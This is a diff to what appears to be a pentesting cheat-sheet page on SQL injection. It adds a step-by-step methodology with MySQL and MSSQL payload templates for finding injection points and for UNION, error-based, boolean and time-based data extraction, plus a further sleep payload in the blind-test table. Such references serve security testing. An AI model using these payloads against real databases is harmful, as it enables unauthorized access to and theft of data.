@@ -19,7 +19,70 @@ order: 5
 ' ` " ; /* --
 {% endhighlight %}
 
-**Blind Test Strings:**<br>
+**Methodology***
+
+1. Determine injection point and how to break out:
+
+{% highlight sql %}
+
+SELECT info From users WHERE id = [UserInput]
+SELECT info From users WHERE id = ' [UserInput] '
+SELECT info From users WHERE id = " [UserInput] "
+SELECT info From users WHERE (type='admin' AND id = [UserInput])
+
+{% endhighlight %}
+
+2. Use test strings like:
+
+{% highlight sql %}
+
+SELECT info From users WHERE id = 1
+SELECT info From users WHERE id = -9999
+SELECT info From users WHERE id = 1 AND 1=1
+SELECT info From users WHERE id = 1 AND 'a'='a
+SELECT info From users WHERE id = 1 AND 1=2
+{% endhighlight %}
+
+3. Exfiltration:
+
+{% highlight sql %}
+MySQL: 0 Union SELECT 'data' LIMIT [offset], [rows]
+MSSQL: 0 UNION SELECT TOP [r] 'data' WHERE data_column not in (SELECT TOP [offset] 'data')
+{% endhighlight %}
+
+4. Error Based Exfiltration:
+
+{% highlight sql %}
+MYSQL: 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT '[data]'), FLOOR(RAND(0)*2)) x from users group by x) a)
+MSSQL: 1 and 1=convert(int, (SELECT '[data]'))
+{% endhighlight %}
+
+4. Boolean Based Exfiltration:
+
+{% highlight sql %}
+--Known data
+if (((SELECT 'data') = 'password'), 1, 0)
+
+--Binary Search Tree
+MySQL: 1 AND ASCII(MID((SELECT 'data'),[c],1))>79
+MSSSQL: 1 AND ASCII(SUBSTRING((SELECT 'data'),[c],1))>79
+
+{% endhighlight %}
+
+5. Timing based QUERY:
+
+{% highlight sql %}
+MySQL: IF ([condition], SLEEP([s]), 0)
+MSSQL: 1 IF ([condition]) WAITFOR DELAY '0:0:[s]'
+{% endhighlight %}
+
+6. Side Channel
+
+* Use file /OS operations to write to web root
+* Write output to Samba file share
+
+**Blind Test Strings:**
+
 *Try the following to see if it provides valid results for text that was interpreted:*
 
 Commenting out the end | <code> Brent' ;# <br> Dent' ;-- <br> Dent' ;-- - </code>
@@ -30,6 +93,7 @@ Concatenation | <code> De''nt <br> De'||'nt </code>
 Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
 Sleep MySQL | <code> Sleep(10) </code>
 Sleep MySQL2 | <code> id=1-sleep(10)  </code>
+Sleep MySQL3 | <code> and (select Sleep(10) =0) </code>
 Sleep MSSQL | <code> WAITFOR DELAY '0:0:10'  MSSQL </code> 
 
 Math | <code> id=1-0 </code>
